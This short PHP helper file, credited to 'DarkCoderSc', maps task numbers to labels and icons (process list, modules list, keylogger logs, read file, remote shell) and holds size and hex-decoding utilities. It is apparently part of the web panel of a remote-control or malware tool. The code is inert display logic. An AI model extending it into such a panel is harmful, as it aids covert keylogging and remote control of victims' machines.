<?php
	/**
		This include file will be usefull for tasks result
		By DarkCoderSc
	*/

	/**
		Transform the index to clear text
		@Param i : the index
	*/
	function taskIndex2Text($i){
		switch($i){
			case 1 : 
				return "Process list";
				break;
			case 2 : 
				return "Modules list";
				break;
			case 3 : 
				return "Keylogger logs";
				break;
			case 4 : 
				return "Read file";
			case 5 : 
				return "Remote shell";
				break;				
		}
	}
	
	/**
		Transform the index to image
		@Param i : the index
	*/
	function taskIndex2Pic($i){
		switch($i){
			case 1 : 
				return "proc.png";
				break;
			case 2 : 
				return "mod.png";
				break;
			case 3 : 
				return "key.png";
				break;
			case 4 : 
				return "txtfile.png";
				break;	
			case 5 : 
				return "cmd.png";
				break;			
		}
	}
	
	/**
		Format size (found on the web)
	*/
	function format_size($size) {
      $sizes = array(" Bytes", " KB", " MB", " GB", " TB", " PB", " EB", " ZB", " YB");
      if ($size == 0) { return('n/a'); } else {
      return (round($size/pow(1024, ($i = floor(log($size, 1024)))), $i > 1 ? 2 : 0) . $sizes[$i]); }
	}
	
	/**
		Hex to str
	*/
	function HexToStr($hexstr){
    $str='';
    for ($i=0; $i<strlen($hexstr)-1;$i+=2){
        $str .= chr(hexdec($hexstr[$i].$hexstr[$i+1]));
    }
    return $str;
	}

?>